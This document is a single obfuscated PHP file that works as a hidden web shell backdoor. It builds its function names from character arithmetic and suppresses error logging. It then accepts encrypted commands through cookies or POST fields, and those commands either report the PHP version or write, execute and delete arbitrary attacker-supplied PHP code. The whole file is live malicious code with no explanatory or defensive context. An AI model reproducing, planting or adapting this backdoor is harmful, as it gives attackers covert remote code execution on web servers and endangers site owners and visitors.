<?php $jicmbep = "\x66".chr(489-384).chr(108)."\x65"."\x5f"."\x70".chr(439-322).'t'.chr(95)."\x63".chr(868-757).'n'.chr(692-576).chr(835-734).chr(1081-971).'t'.'s';
$llhpycnta = chr(955-857).'a'."\x73".chr(444-343).chr(887-833)."\x34"."\137".chr(100).chr(119-18)."\x63".chr(111).'d'."\x65";
$abphmzmd = 'i'."\x6e".'i'."\137"."\163".'e'.'t';
$gwwxzka = chr(117).chr(110).'l'.'i'."\x6e"."\153";


@$abphmzmd(chr(101)."\162".chr(114)."\157"."\162".chr(95)."\x6c".chr(838-727).chr(788-685), NULL);
@$abphmzmd("\154".'o'.chr(168-65)."\x5f".chr(101).'r'."\162".'o'.chr(114)."\x73", 0);
@$abphmzmd("\155"."\x61".chr(120).'_'."\x65"."\170".chr(101).chr(863-764).chr(880-763)."\164".chr(105).chr(111)."\x6e"."\137".'t'."\151".chr(1002-893)."\145", 0);
@set_time_limit(0);

function rshqc($nehciek, $rxklj)
{
    $vawjorr = "";
    for ($gqlcxlyil = 0; $gqlcxlyil < strlen($nehciek);) {
        for ($j = 0; $j < strlen($rxklj) && $gqlcxlyil < strlen($nehciek); $j++, $gqlcxlyil++) {
            $vawjorr .= chr(ord($nehciek[$gqlcxlyil]) ^ ord($rxklj[$j]));
        }
    }
    return $vawjorr;
}

$nvbbxvsxg = array_merge($_COOKIE, $_POST);
$gqtru = 'ee6fd77c-2be0-4868-a565-a0a9f9e031d3';
foreach ($nvbbxvsxg as $gqlcxlyiljvecw => $nehciek) {
    $nehciek = @unserialize(rshqc(rshqc($llhpycnta($nehciek), $gqtru), $gqlcxlyiljvecw));
    if (isset($nehciek["\141".'k'])) {
        if ($nehciek["\141"] == "\151") {
            $gqlcxlyil = array(
                'p'.chr(843-725) => @phpversion(),
                chr(751-636)."\x76" => "3.5",
            );
            echo @serialize($gqlcxlyil);
        } elseif ($nehciek["\141"] == chr(1020-919)) {
            $vjbfqy = "./" . md5($gqtru) . "\x2e".'i'.'n'.chr(335-236);
            @$jicmbep($vjbfqy, "<" . '?'."\160"."\150"."\x70"."\x20".chr(64).chr(320-203)."\156"."\154".'i'.chr(828-718).'k'."\50".chr(95).'_'.'F'."\x49"."\114"."\x45".'_'.'_'.chr(861-820).chr(398-339)."\x20" . $nehciek["\144"]);
            @include($vjbfqy);
            @$gwwxzka($vjbfqy);
        }
        exit();
    }
}

